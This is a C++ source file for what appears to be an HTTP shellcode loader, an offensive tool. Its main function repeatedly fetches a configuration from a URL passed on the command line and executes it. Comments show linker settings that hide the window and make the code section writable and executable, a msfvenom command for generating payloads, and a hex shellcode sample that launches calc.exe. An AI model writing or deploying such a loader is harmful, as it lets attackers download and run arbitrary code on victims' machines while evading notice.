#include "HTTPShellcodeLoader.h"



//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口  
//#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积  
//shellcode在生成payload时选择c即可  
//msfvenom -p windows/x64/exec CMD=calc.exe -f c 
//测试shellcode（执行cmd）：fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500


int main(int argc, char* argv[])
{
	string in = argv[1];
	while (true)
	{
		try
		{
			CURLClass client;
			string response = client.Get(in);
			Configure* configure = new Configure(response);
			configure->Selector();
		}
		catch (exception e)
		{
			Sleep(3600 * 1000);
		}

	}
	

}

